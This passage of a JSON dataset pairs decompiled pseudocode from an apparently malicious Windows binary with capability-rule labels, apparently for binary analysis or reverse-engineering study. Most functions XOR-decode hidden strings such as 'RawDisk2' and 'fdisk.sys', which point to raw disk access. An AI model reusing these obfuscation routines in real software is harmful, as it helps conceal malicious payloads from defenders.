        "decompiled_code": "\nvoid fcn.00028dd4(int64_t arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    int64_t iVar2;\n    \n    if (*0x6986f != '\\0') {\n        pcVar1 = \"Par1\";\n        iVar2 = 0x40;\n        do {\n            *pcVar1 = *pcVar1 ^ pcVar1[-0x40];\n            pcVar1 = pcVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066842(arg1, arg2, 0x11fb8);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 162
    },
    "00028e2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028e2c(int64_t arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    int64_t iVar2;\n    \n    if (*0x698ef != '\\0') {\n        pcVar1 = \"Par2\";\n        iVar2 = 0x40;\n        do {\n            *pcVar1 = *pcVar1 ^ pcVar1[-0x40];\n            pcVar1 = pcVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066842(arg1, arg2, 0x11fb8);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 162
    },
    "00028e84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028e84(int64_t arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    int64_t iVar2;\n    \n    if (*0x6986f != '\\0') {\n        pcVar1 = \"Par1\";\n        iVar2 = 0x40;\n        do {\n            *pcVar1 = *pcVar1 ^ pcVar1[-0x40];\n            pcVar1 = pcVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066842(arg1, arg2, 0x11f20);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 162
    },
    "00028edc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028edc(int64_t arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    int64_t iVar2;\n    \n    if (*0x698ef != '\\0') {\n        pcVar1 = \"Par2\";\n        iVar2 = 0x40;\n        do {\n            *pcVar1 = *pcVar1 ^ pcVar1[-0x40];\n            pcVar1 = pcVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066842(arg1, arg2, 0x11f20);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 161
    },
    "00028f34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028f34(int64_t arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    int64_t iVar2;\n    \n    if (*0x6986f != '\\0') {\n        pcVar1 = \"Par1\";\n        iVar2 = 0x40;\n        do {\n            *pcVar1 = *pcVar1 ^ pcVar1[-0x40];\n            pcVar1 = pcVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066722(arg1, arg2, 0x11fc8);\n    *(arg1 + (arg2 - 1) * 2) = 0;\n    return;\n}\n",
        "token_count": 166
    },
    "00028f8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028f8c(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x6996f != '\\0') {\n        puVar1 = 0x69930;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066722(arg1, arg2, 0x11fd8);\n    *(arg1 + (arg2 - 1) * 2) = 0;\n    return;\n}\n",
        "token_count": 171
    },
    "00028fe4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028fe4(int64_t arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    int64_t iVar2;\n    \n    if (*0x699ef != '\\0') {\n        pcVar1 = \"RawDisk2\";\n        iVar2 = 0x40;\n        do {\n            *pcVar1 = *pcVar1 ^ pcVar1[-0x40];\n            pcVar1 = pcVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066722(arg1, arg2, 0x11fd8);\n    *(arg1 + (arg2 - 1) * 2) = 0;\n    return;\n}\n",
        "token_count": 166
    },
    "0002903c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0002903c(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x69a6f != '\\0') {\n        puVar1 = 0x69a30;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066722(arg1, arg2, 0x11f88);\n    *(arg1 + (arg2 - 1) * 2) = 0;\n    return;\n}\n",
        "token_count": 172
    },
    "00029094": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00029094(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x69b6f != '\\0') {\n        puVar1 = 0x69b30;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066830(arg1, 0x69b30, arg2);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 167
    },
    "000290e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000290e4(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x69bef != '\\0') {\n        puVar1 = 0x69bb0;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066830(arg1, 0x69bb0, arg2);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 166
    },
    "00029134": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00029134(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x69b6f != '\\0') {\n        puVar1 = 0x69b30;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066722(arg1, arg2, 0x119cc);\n    *(arg1 + (arg2 - 1) * 2) = 0;\n    return;\n}\n",
        "token_count": 170
    },
    "0002918c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0002918c(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x69bef != '\\0') {\n        puVar1 = 0x69bb0;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066722(arg1, arg2, 0x119cc);\n    *(arg1 + (arg2 - 1) * 2) = 0;\n    return;\n}\n",
        "token_count": 169
    },
    "000291e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000291e4(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x69b6f != '\\0') {\n        puVar1 = 0x69b30;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066842(arg1, arg2, 0x11f28);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 168
    },
    "0002923c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0002923c(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x69c6f != '\\0') {\n        puVar1 = 0x69c30;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066842(arg1, arg2, 0x11ff0);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 168
    },
    "00029294": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00029294(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x69cef != '\\0') {\n        puVar1 = 0x69cb0;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066830(arg1, 0x69cb0, arg2);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 165
    },
    "000292e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000292e4(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x69d6f != '\\0') {\n        puVar1 = 0x69d30;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066830(arg1, 0x69d30, arg2);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 168
    },
    "00029334": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00029334(int64_t arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    int64_t iVar2;\n    \n    if (*0x69def != '\\0') {\n        pcVar1 = \"fdisk.sys\";\n        iVar2 = 0x40;\n        do {\n            *pcVar1 = *pcVar1 ^ pcVar1[-0x40];\n            pcVar1 = pcVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066830(arg1, \"fdisk.sys\", arg2);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 159
    },
    "00029384": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00029384(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x69e6f != '\\0') {\n        puVar1 = 0x69e30;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066830(arg1, 0x69e30, arg2);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 167
    },
    "000293d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000293d4(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    int64_t iVar3;\n    \n    if (*0x69eef != '\\0') {\n        puVar2 = 0x69eb0;\n        iVar3 = 0x40;\n        do {\n            *puVar2 = *puVar2 ^ puVar2[-0x40];\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    iVar1 = fcn.00066848();\n    iVar3 = iVar1 * 0x100000;\n    *arg1 = iVar3;\n    if ((iVar3 < 0) || (0x7fffffff < iVar3)) {\n        *arg1 = 0x6400000;\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "00029430": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00029430(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    int64_t iVar3;\n    \n    if (*0x69f6f != '\\0') {\n        puVar2 = 0x69f30;\n        iVar3 = 0x40;\n        do {\n            *puVar2 = *puVar2 ^ puVar2[-0x40];\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    iVar1 = fcn.00066848();\n    iVar3 = iVar1 * 0x100000;\n    *arg1 = iVar3;\n    if ((iVar3 < 0) || (0x7fffffff < iVar3)) {\n        *arg1 = 0x1000000;\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "0002948c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0002948c(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x695ef != '\\0') {\n        puVar1 = 0x695b0;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066830(arg1, 0x695b0, arg2);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 166
    },
    "000294dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000294dc(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x695ef != '\\0') {\n        puVar1 = 0x695b0;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066842(arg1, arg2, 0x12008);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 164
    },
    "00029534": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00029534(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x6966f != '\\0') {\n        puVar1 = 0x69630;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066842(arg1, arg2, 0x11ff0);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 165
    },
    "0002958c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0002958c(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x696ef != '\\0') {\n        puVar1 = 0x696b0;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066842(arg1, arg2, 0x11ff0);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 166
    },
    "000295e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000295e4(int64_t arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    int64_t iVar2;\n    \n    if (*0x6976f != '\\0') {\n        pcVar1 = \"isapi_dg\";\n        iVar2 = 0x40;\n        do {\n            *pcVar1 = *pcVar1 ^ pcVar1[-0x40];\n            pcVar1 = pcVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066842(arg1, arg2, 0x11ff0);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 164
    },
    "00029cd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00029cd0(ulong arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    ulong arg4_00;\n    uint32_t auStackX8 [8];\n    char *in_stack_00000028;\n    uint32_t uStack392;\n    uint32_t uStack388;\n    uint32_t uStack384;\n    int32_t iStack376;\n    int32_t iStack372;\n    int32_t iStack368;\n    int32_t iStack364;\n    ulong uStack328;\n    ulong uStack320;\n    uchar auStack296 [272];\n    \n    auStackX8[0] = arg1;\n    fcn.00030310(0x7ee10);\n    iVar2 = fcn.00022168(0xfffffffe, 8, auStackX8, &uStack392);\n    if (iVar2 == 0) {\n        if (((arg3 != 1) || (iStack372 != 1)) ||\n           ((iStack376 != arg2 && (((iStack376 != 0 && (iStack364 != arg2)) && (iStack364 != 0)))))) {\n            uVar4 = 0x21590064;\n            goto code_r0x00029f64;\n        }\n        iVar2 = fcn.000270f4(uStack384, uStack388, in_stack_00000028, 0x104);\n        if (iVar2 != 0) {\ncode_r0x00029dee:\n            uVar4 = iVar2 + 0x191U | 0x21590000;\n            goto code_r0x00029f64;\n        }\n        iStack368 = iStack368 + 1;\n        iVar2 = fcn.0002231c(uStack392, uStack384, uStack388, 2);\n        if (iVar2 != 0) goto code_r0x00029dee;\n        if (arg2 != 0) {\n            if (iStack376 == 0) {\n                arg4_00 = 0;\n                iStack376 = arg2;\n            }\n            else {\n                if (iStack364 != 0) goto code_r0x00029f62;\n                arg4_00 = 3;\n                iStack364 = arg2;\n            }\n            iVar2 = fcn.0002231c(uStack392, uStack384, uStack388, arg4_00);\n            if (iVar2 != 0) goto code_r0x00029dee;\n        }\ncode_r0x00029f62:\n        uVar4 = 0;\n    }\n    else {\n        if (*0x69078 == 0) {\n            iVar2 = fcn.00031628(0x104, auStack296);\n            if (iVar2 != 0) goto code_r0x00029e52;\ncode_r0x00029e28:\n            uVar4 = fcn.00030eb8();\n            goto code_r0x00029f64;\n        }\n        if (arg3 == 1) {\n            fcn.00028e2c(auStack296, 0x104);\n        }\n        else {\n            fcn.00028dd4(auStack296, 0x104);\n        }\ncode_r0x00029e52:\n        if (arg4 == 0) {\n            iVar2 = fcn.000314b8(auStack296, 0x12018, 0, in_stack_00000028);\n            if (iVar2 == 0) goto code_r0x00029e28;\n        }\n        else {\n            fcn.00044350(in_stack_00000028, 0x104, 0x12010, auStack296);\n        }\n        iVar3 = -1;\n        pcVar5 = in_stack_00000028;\n        do {\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        uStack328 = CONCAT44(arg3, arg2);\n        uStack320 = 1;\n        iVar2 = fcn.000272c0(8, auStackX8[0], in_stack_00000028, ~iVar3);\n        if (iVar2 == 0) {\n            if ((arg3 & 1) == 0) goto code_r0x00029f62;\n            uVar4 = fcn.0002963c(auStackX8[0], in_stack_00000028);\n            if (uVar4 == 0) goto code_r0x00029f64;\n            iVar2 = fcn.00022168(0xfffffffe, 8, auStackX8, &uStack392);\n            if (iVar2 == 0) {\n                fcn.0002225c(uStack392, uStack384, uStack388);\n            }\n        }\n        else {\n            uVar4 = iVar2 + 0x191U | 0x21590000;\n        }\n        fcn.00031afc(in_stack_00000028);\n    }\ncode_r0x00029f64:\n    fcn.00030378(0x7ee10);\n    return uVar4;\n}\n",
        "token_count": 1194
    },
    "0002ba2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0002ba2c(uint32_t *arg1, ulong *arg2, int32_t *arg3)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    ulong *puVar4;\n    ulong uVar5;\n    int32_t *piVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    int32_t *piVar9;\n    uint32_t *puVar10;\n    int64_t iVar11;\n    int32_t iVar12;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar18;\n    uint64_t uVar19;\n    uint32_t uStackX8;\n    uint32_t uStackX32;\n    uint64_t uVar17;\n    \n    uVar8 = 0;\n    uVar17 = uVar8;\n    if (arg1[4] != 0) {\n        uVar14 = arg1[4];\n        uVar13 = uVar8;\n        do {\n            if (*arg1 != 0) {\n                uVar15 = *arg1;\n                piVar9 = *(uVar13 + *(arg1 + 6));\n                piVar6 = *(arg1 + 2) + 4;\n                do {\n                    if (*piVar6 == 200) {\n                        uVar16 = uVar17 + 4 + *piVar9 * 2;\n                    }\n                    else {\n                        uVar16 = uVar17 + 4 + *piVar9;\n                    }\n                    uVar17 = uVar16;\n                    piVar6 = piVar6 + 2;\n                    piVar9 = piVar9 + 6;\n                    uVar15 = uVar15 - 1;\n                } while (uVar15 != 0);\n            }\n            uVar13 = uVar13 + 8;\n            uVar14 = uVar14 - 1;\n        } while (uVar14 != 0);\n    }\n    puVar4 = fcn.00030c98(*arg1 * 0x11 + 0x14 + uVar17);\n    if (puVar4 == NULL) {\n        uVar5 = 0x21590004;\n    }\n    else {\n        *puVar4 = 0;\n        puVar4[1] = 0;\n        *(puVar4 + 2) = 0;\n        *puVar4 = *arg1;\n        *(puVar4 + 4) = arg1[4];\n        uVar2 = fcn.00030dc8(*puVar4);\n        *puVar4 = uVar2;\n        uVar2 = fcn.00030dc8(*(puVar4 + 4));\n        puVar10 = puVar4 + 0x14;\n        *(puVar4 + 4) = uVar2;\n        fcn.0006677c(puVar10, 0);\n        uVar13 = uVar8;\n        uVar14 = uVar8;\n        if (*arg1 != 0) {\n            do {\n                *puVar10 = *(*(arg1 + 2) + uVar13);\n                cVar1 = *(*(arg1 + 2) + 4 + uVar13);\n                *(puVar10 + 1) = cVar1;\n                if ((cVar1 == -0x38) || (cVar1 == -0x37)) {\n                    *(puVar10 + 1) = 4;\n                }\n                uVar16 = fcn.00030dc8(*puVar10);\n                uVar18 = uVar14 + 1;\n                *puVar10 = uVar16;\n                puVar10 = puVar10 + 0x11;\n                uVar13 = uVar13 + 8;\n                uVar14 = uVar18;\n            } while (uVar18 < *arg1);\n        }\n        uVar16 = *arg1;\n        uStackX32 = 0;\n        uVar14 = uVar16 * 0x11 + 0x14;\n        uVar13 = uVar8;\n        if (arg1[4] != 0) {\n            do {\n                uVar7 = 0;\n                uStackX8 = 0;\n                uVar15 = uVar7;\n                uVar19 = uVar7;\n                uVar18 = uVar8;\n                if (uVar16 != 0) {\n                    do {\n                        iVar12 = uVar14;\n                        if (*(uVar19 + 4 + *(arg1 + 2)) == 200) {\n                            iVar11 = *(uVar13 + *(arg1 + 6));\n                            if ((*(iVar11 + uVar15) == 0) || (iVar11 = *(iVar11 + 8 + uVar15),  iVar11 == 0)) {\n                                *(uVar14 + puVar4) = 0;\n                                uVar16 = iVar12 + 4;\n                                uStackX8 = uVar7;\n                            }\n                            else {\n                                iVar3 = fcn.0003292c(iVar11);\n                                uVar2 = fcn.00030dc8(iVar3 * 2);\n                                *(uVar14 + puVar4) = uVar2;\n                                fcn.0003285c(*(*(uVar13 + *(arg1 + 6)) + 8 + uVar15), iVar12 + 4U + puVar4, \n                                             0xffffffffffffffff);\n                                uVar16 = iVar12 + 4U + iVar3 * 2;\n                            }\n                        }\n                        else {\n                            uVar2 = fcn.00030dc8(*(*(uVar13 + *(arg1 + 6)) + uVar15));\n                            *(uVar14 + puVar4) = uVar2;\n                            iVar11 = iVar12 + 4U + puVar4;\n                            fcn.0006670a(iVar11, *(*(uVar13 + *(arg1 + 6)) + 8 + uVar15));\n                            fcn.000203ac(*(uVar19 + 4 + *(arg1 + 2)), iVar11, *(*(uVar13 + *(arg1 + 6)) + uVar15));\n                            uVar16 = iVar12 + 4U + *(*(uVar13 + *(arg1 + 6)) + uVar15);\n                        }\n                        uVar14 = uVar16;\n                        uVar16 = *arg1;\n                        uStackX8 = uStackX8 + 1;\n                        uVar7 = 